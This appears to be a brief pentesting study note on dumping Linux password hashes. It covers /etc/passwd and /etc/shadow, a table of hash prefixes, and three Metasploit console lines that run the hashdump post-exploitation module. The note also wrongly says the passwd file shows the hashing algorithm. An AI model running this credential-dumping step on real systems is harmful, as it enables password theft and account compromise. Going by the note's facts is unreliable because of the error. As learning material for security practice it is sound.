---
up: "[[Linux Credential Dumping]]"
---

# Dumping Linux Password Hashes

## Linux Password Hashes

- Linux is multi-user support
	- Both an advantage and disadvantage
- All the information for all accounts is stored in the `/etc/passwd` file
- All the encrypted passwords are stored in the `/etc/shadow` file
	- Only readable by root

- The `passwd` file gives us information regards to the hashing algorithm used:

| Prefix | Algorithme |
| ---- | ---- |
| $1 | MD5 |
| $2 | Blowfish |
| $5 | SHA-256 |
| $6 | SHA-512 |

## Demonstration

```bash
> use post/linux/gather/hashdump
> set SESSION <id>
> run
```
